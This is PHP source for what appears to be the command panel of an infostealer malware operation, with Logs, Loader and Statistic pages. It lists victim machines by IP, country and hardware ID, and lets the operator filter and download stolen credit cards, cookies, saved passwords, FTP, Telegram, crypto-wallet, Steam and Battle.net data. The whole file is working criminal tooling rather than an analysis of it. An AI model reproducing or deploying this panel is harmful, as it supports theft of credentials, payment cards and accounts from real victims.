<?php
require('mysql.php');
error_reporting(0);
ini_set('memory_limit', '-1');

function filter($norm, $arr){
	$quest = "SELECT * FROM `users` WHERE id > -1";
	
	foreach($norm['norm'] as $n){
		if($n=='cc'){ $quest.=' && cc > 0'; $arr['cc'] = 'checked';}
		if($n=='autofill'){ $quest.=' && autofill > 0'; $arr['autofill'] = 'checked';}
		if($n=='cookies'){ $quest.=' && cookies > 0'; $arr['cookies'] = 'checked';}
		if($n=='filezilla'){ $quest.=' && filezilla > 0'; $arr['filezilla'] = 'checked';}
		if($n=='passwords'){ $quest.=' && passwords > 0'; $arr['passwords'] = 'checked';}
		if($n=='telegram'){ $quest.=' && telegram > 0'; $arr['telegram'] = 'checked';}
		if($n=='crypto'){ $quest.=' && crypto > 0'; $arr['crypto'] = 'checked';}
		if($n=='jabber'){ $quest.=' && pidgin > 0'; $arr['pidgin'] = 'checked';}
		if($n=='steam'){ $quest.=' && steam > 0'; $arr['steam'] = 'checked';}
		if($n=='BattleNet'){ $quest.=' && BattleNet > 0'; $arr['BattleNet'] = 'checked';}
		if($n=='filezilla'){ $quest.=' && filezilla > 0'; $arr['filezilla'] = 'checked';}
	}
	
	return array($quest, $arr);
}

if ($_COOKIE["pwd"] === md5($panel_password))  {
    $arr = []; 
	$f = filter($_POST, $arr);
	$quest = $f[0];
	$arr = $f[1];
	
	if(isset($_GET['page'])){	
		$page = $_GET['page'];
	}else{
		$page = 1;
	}
		
	$inpu = '';
	foreach($arr as $key => $value){
		$inpu.= '<input type="hidden" id="'.$key.'" name="norm[]" value="'.$key.'"'.$value.'\>';
	}
?>
<html>
<head>
<link href="bootstrap.css" rel="stylesheet" id="bootstrap-css">
<link rel="stylesheet" href="w3.css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
<link href="bar.css" rel="stylesheet" id="bootstrap-css">

<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script src="http://getbootstrap.com/dist/js/bootstrap.min.js"></script>
</head>
<body class="w3-light-gray">

<style>
.w3-headfont {
  font-family: "Comic Sans MS", cursive, sans-serif;
}
</style>
    
<div class="w3-sidebar w3-light-gray w3-bar-block w3-collapse w3-card w3-animate-left" style="width:200px;" id="mySidebar">
  <h4 class="w3-bar-item w3-red">Panel v1.1</h4>
  <a class="w3-bar-item w3-button" href="index.php">Logs</a>
  <a class="w3-bar-item w3-button" href="loader.php">Loader</a>
  <a class="w3-bar-item w3-button" href="stat.php">Statistic</a>
  <a class="w3-bar-item w3-button" href="features.php">Features</a>
</div>

<div class="main">

<form action="index.php?page=<?=$page?>" style="margin-bottom: -10px;" method="POST">
    <input type="checkbox" id="autofill" name="norm[]" value="autofill" <?=$arr['autofill']?>/><label style="font-size: 11pt; text-shadow:1px 1px 0 #444" for="autofill">autofill</label>   
    <input type="checkbox" id="cc" name="norm[]" value="cc" <?=$arr['cc']?>/><label style="font-size: 11pt; text-shadow:1px 1px 0 #444" for="cc">Credit Cards</label>   
    <input type="checkbox" id="cookies" name="norm[]" value="cookies" <?=$arr['cookies']?>/><label style="font-size: 11pt; text-shadow:1px 1px 0 #444" for="cookies">Cookies</label>   
    <input type="checkbox" id="filezilla" name="norm[]" value="filezilla" <?=$arr['filezilla']?>/><label style="font-size: 11pt; text-shadow:1px 1px 0 #444" for="filezilla">FileZilla</label>   
    <input type="checkbox" id="passwords" name="norm[]" value="passwords" <?=$arr['passwords']?>/><label style="font-size: 11pt; text-shadow:1px 1px 0 #444" for="passwords">Passwords</label>   
    <input type="checkbox" id="crypto" name="norm[]" value="crypto" <?=$arr['crypto']?>/><label style="font-size: 11pt; text-shadow:1px 1px 0 #444" for="crypto">crypto.dat</label>   
    <input type="checkbox" id="telegram" name="norm[]" value="telegram" <?=$arr['telegram']?>/><label style="font-size: 11pt; text-shadow:1px 1px 0 #444" for="telegram">Telegram</label>   
    <input type="checkbox" id="filezilla" name="norm[]" value="filezilla" <?=$arr['filezilla']?>/><label style="font-size: 11pt; text-shadow:1px 1px 0 #444" for="filezilla">FTP</label>   
    <input type="checkbox" id="BattleNet" name="norm[]" value="BattleNet" <?=$arr['BattleNet']?>/><label style="font-size: 11pt; text-shadow:1px 1px 0 #444" for="BattleNet">Battle.net</label>   
    <input type="checkbox" id="steam" name="norm[]" value="steam" <?=$arr['steam']?>/><label style="font-size: 11pt; text-shadow:1px 1px 0 #444" for="steam">Steam</label>   
    <button type="submit" class="btn btn-secondary" name="filter"/>Filter</button>
</form>

<div class="w3-panel w3-card-4 w3-red w3-display-container">
  <span onclick="this.parentElement.style.display='none'"
  class="w3-button w3-large w3-display-topright">&times;</span>
  <h6 style="color: white;">Info!</h6>
  <h5 style="color: white;">Remove all - will remove all logs from current page</h5>
  <h5 style="color: white;">Download all - will download all logs from current page</h5>
  <h5 style="color: white;">Clean statistic - will clean statistic of logs</h5>
</div>
    
<form action="delete.php?page=<?=$page?>" style="display:inline;" method="POST">
<button type="submit" class="btn w3-round-xlarge w3-border w3-border-red" name="all" value="">Remove all
</button>
</form>
			
<form action="log.php?page=<?=$page?>" style="display:inline;" method="POST">
<button type="submit" class="btn w3-round-xlarge w3-border w3-border-red" name="all" value="">Download all
</button>
</form>
    
<form action="stat.php" style="display:inline-block;" method="POST">
<button type="submit" class="btn w3-round-xlarge w3-border w3-border-red" name="clean" value="true">Clean statistic
</button>
</form>

<table id="logstable" class="table table-bordred table-striped">
    <thead>
        <th>Id</th>
        <th>Ip</th>
        <th>Country</th>
        <th>User hwid</th>
        <th>Logs</th>
        <th>Action</th>
    </thead>
<tbody>
    
<?php
$answer = $base->query($quest);
$row = $answer->fetchAll();
$output="";
$pages = (int)(count($row)/64)+1;
		
for($i = 64*($pages - $page)+63; $i>=64*($pages - $page); $i--){
if(!isset($row[$i]['id'])){
    continue;
}
			
$output .= '<tr>
            <td>'.$i.'</td>
            <td>'.$row[$i]['ip'].'</td>
            <td>'.$row[$i]['country'].'</td>
            <td>'.$row[$i]['hwid'].'</td>
            <td>
            <form action="log.php" method="POST">
            <button type="submit" name="id" value="'.$row[$i]['id'].'" style="
			background: transparent;
			border: none !important;
			outline:none; ">
                <img src="./img/get.png"/>
            </button>	
            </form>
            </td>
	    <td>
            <form action="delete.php?page='.$page.'" method="POST">
            <button type="submit" name="id" value="'.$row[$i]['id'].'" style="
            background: transparent;
            border: none !important;
            outline:none; ">
            <img src="./img/del.png"/>
            </button>
            </form>
            </td>
						
            </tr>';
}
echo $output;
?>	   
</tbody>
</table>
<div class="clearfix"></div>
<ul class="pagination pull-right">
<li class="disabled"><a href="#"><span class="glyphicon glyphicon-chevron-left"></span></a></li>
<?php
    $outpu="";
    for($i = 1; $i < $pages+1; $i++){
    if($page != $i){
    $outpu.= '<form action="index.php?page='.$i.'" method="POST">';
    $outpu.= '<button style="background-color: Transparent;
                background-repeat:no-repeat;
		border: none;
		cursor:pointer;
		overflow: hidden;" 
		type="submit" name="" value="filter" class="btn-link">'.$i.'</button>
              </form>';
    }else{
$outpu.= '<form><button style="background-color: Transparent;
	  background-repeat:no-repeat;
	  border: none;
	  cursor:pointer;
	  overflow: hidden;" 
	  type="submit" name="page" value="'.$i.'" class="btn-link">'.$i.'</button></form>';
	}					
    }
?>
				  
<?=$outpu?>
				  
<li><a href="#"><span class="glyphicon glyphicon-chevron-right"></span></a></li>
</ul>
</div>
</body>
</html>
<?php
}else{
	header("location: login.php");
}
?>